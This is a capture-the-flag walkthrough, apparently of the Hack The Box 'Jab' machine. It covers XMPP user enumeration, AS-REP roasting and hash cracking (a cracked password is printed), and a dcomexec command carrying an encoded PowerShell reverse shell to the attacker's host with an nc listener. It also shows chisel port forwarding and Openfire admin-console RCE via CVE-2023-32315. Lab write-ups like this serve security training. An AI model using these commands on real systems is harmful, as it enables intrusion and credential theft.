nmap -p- 10.10.14.4
nmap -A -p[] 10.10.14.4

port 5222 open, jabber and XMPP services running which are chat services. I searched for “xmpp jabber” in google and one of the first results I got was a client called “Pidgin” that will let me connect to the chat service.

After installing I simply ran pidgin with “pidgin” in the terminal and the app popped up on my screen asking me to add an account.
Click “+ Add” → Change the protocol to XMPP → Enter a username → Enter the domain “jab.htb” → Choose a password → And tick the box “Create this new account on the server” → Enter the target IP in the connect server box -> Then add the account.

A prompt will appear for “XMPP Client Registration”. Just input your username, the email that you can see in the Accounts window, and your password.

Click on “Buddies” in the top left → Join a Chat → and click on “Room List”.
2 popups will appear. Leave the search for a Conference Server as “conference.jab.htb” and click “Find Rooms” 
2 Chat Rooms will pop up. To join a room just select it and click Join.

“test2” is the only chat room I can join and upon joining I see that there is nobody online to talk to and there is no useful information either.
Since there is nothing here I searched pidgins features there is one in particular that seems useful. Pidgin has a feature that allows for me to find users on a domain.

Heading back over to the Buddy List, click on the “Accounts” tab at the top, Then click on the account you created “<username>@jab.htb/ (XMPP)”, then choose the “Search for Users” option.

After selecting this a window will pop up to select a User Directory, just click “Search Directory” → Another window will pop up asking for an advanced search. To get as much info as possible enter an asterisk (*) and press OK

A gigantic list of search results will be outputted.

In order to get this user list I have to go create new pidgin session. "sudo pidgin -d > output.log"

I am going to use some regular expressions to get rid of everything I don’t need. All I will be left with is the usernames.

grep -oP '<value>\K[^<]+@jab.htb(?=</value>)' output.log | sed 's/@jab.htb//g' | sort | uniq > outputfiltered.lst

Rembering that kerberos is running on port 88 I can attempt to an attack called AS-REP Roasting. This will allow me to get hashes for users that don’t require pre-authentication.

impacket-GetNPUsers -request -usersfile outputfiltered.lst -dc-ip 10.10.11.4 jab.htb/ -outputfile hashes.asreproast

hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force

$krb5asrep$23$jmontgomery@JAB.HTB:73583704fa50356bb360be2bb5b26c01$b3508b26fd7f5e85e617fc18dc701312d4048ec25c390d78448e889d2a15bb80a756223e657ae8ba8bc1bf0e946f63fa3d0bb56b499f521822cb7c5ffb8768673cacbaf3a68dfb13b7a5a44f946f94d6e959169d20077ce4ec88adf0c55194e0a12e80b9adfb5be0680544b15b1bbf44d712d4a41dd4dfdc5858606c3541bb70f2237ea0cce21ac15a91235646a6cb2daad34f7ee763227094429761dfd73117a60df39bf0396802cc83f5f104d67d413c313c8640c62b2adcfbbabbace641b8f014df32b047f9f84a7380fcd553d88c16115d248c500e42faf33be8c2b1c1b368b9:Midnight_121

we log in with pidgin with the user we just got and then search again for rooms.
We see a new room called pentest2003

When reading through the chat there are people talking about an account and how they ran GetUserSPNs.py.
There is a hash for the account ‘svc_openfire’ and the password is already dehashed for us.

Since I can see from my nmap scan that there are a whole bunch of MSRPC services being used, it is safe to assume that DCOM is running.
(DCOM allows for COM objects to communicate with each other over networks)


The impacket tool ‘dcomexec.py’ can be used to remote into svc_openfire

impacket-dcomexec -object MMC20 jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 "cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA5ACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" -silentcommand

sudo rlwrap nc -lvnp 1337 (I was using port 4444 but did not get a connection so changed the port and it worked)

From here I checked to see the services that were running using the following commands.
‘netstat -ano’ to see open ports and services
‘ps’ to get running processes

When scrolling through the ‘ps’ results I saw a running process called “openfire-service” and this relates to the account I am currently on.

So I searched for “openfire-service vulnerability” and a CVE came up.
CVE-2023–32315, and Openfire Admin Console Vulnerability

I then searched for “openfire admin console port” and got results for both port 9090 & 9091.

I had to check to see if these ports were open so I did ran another netstat command ; ‘netstat -ano | findstr 9090’ and repeated it for port 9091.

I can’t access these directly from the shell through so I’m going to need to port forward. I used ‘Chisel’ to do this.

On my machine i run:
./chisel server -p 8050 --reverse

On target machine i run:
./chisel.exe client <tun0>:8050 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091 after we upload chisel.exe 

After visiting 127.0.0.1:9090 you should be met with the openfire admin console login page.

Using the scv_openfire creds i log in.

After this I simply looked at the CVE-2023–32315 vulnerability and got some information on how it works. The main part of the exploit has been patch in version 4.7.5 however, the secondary part has not, and since I already have access I don’t need the first part.

https://github.com/miko550/CVE-2023-32315?source=post_page-----81b06af55ff4--------------------------------

 just curl the .jar file.

To get RCE now head over to “Server” in top left → “Server Settings” → “Management Tool” in bottom left → Then enter ‘123’ into the Admin password.

You should now have System (root) access.

To verify that you have RCE you can click on the drop down → choose the “system command” → Execute the command ‘whoami’.

USe revshells.com and get the flag
